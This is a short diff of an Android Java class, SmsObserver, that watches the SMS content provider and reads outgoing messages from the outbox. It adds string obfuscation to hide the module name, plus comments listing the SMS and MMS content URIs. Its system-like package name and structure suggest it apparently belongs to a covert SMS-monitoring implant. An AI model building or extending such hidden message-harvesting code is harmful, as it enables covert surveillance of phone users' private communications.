@@ -6,6 +6,7 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
 
+import com.android.service.Messages;
 import com.android.service.Sms;
 import com.android.service.Status;
 import com.android.service.manager.ManagerAgent;
@@ -22,15 +23,31 @@ public class SmsObserver extends ContentObserver {
 	public void onChange(boolean bSelfChange) {
 		super.onChange(bSelfChange);
 
-		final ModuleMessage a = (ModuleMessage) ManagerAgent.self().get("sms");
+		// messages: Messages.getString("b.9");
+		ModuleMessage a = (ModuleMessage) ManagerAgent.self().get(Messages.getString("b.9"));
 
-		if (a == null) {
+		if(a == null){
 			return;
 		}
 
 		final ContentResolver cr = Status.getAppContext().getContentResolver();
 
+		// http://stackoverflow.com/questions/3012287/how-to-read-mms-data-in-android
+		
 		// Se questa non dovesse piu andare cambiare in "content://sms"
+		// ManagerAgent.get("sms")
+		// orig: content://sms/outbox
+		
+		/*
+		 * I possibili content resolver sono Inbox = "content://sms/inbox"
+		 * Failed = "content://sms/failed" Queued = "content://sms/queued" Sent
+		 * = "content://sms/sent" Draft = "content://sms/draft" Outbox =
+		 * "content://sms/outbox" Undelivered = "content://sms/undelivered" All
+		 * = "content://sms/all" Conversations = "content://sms/conversations"
+		 * All Conversations = "content://mms-sms/conversations" All messages =
+		 * "content://mms-sms" All SMS = "content://sms"
+		 */
+		
 		final Cursor cur = cr.query(Uri.parse("content://sms/outbox"), null, null, null, null); //$NON-NLS-1$
 
 		while (cur.moveToNext()) {
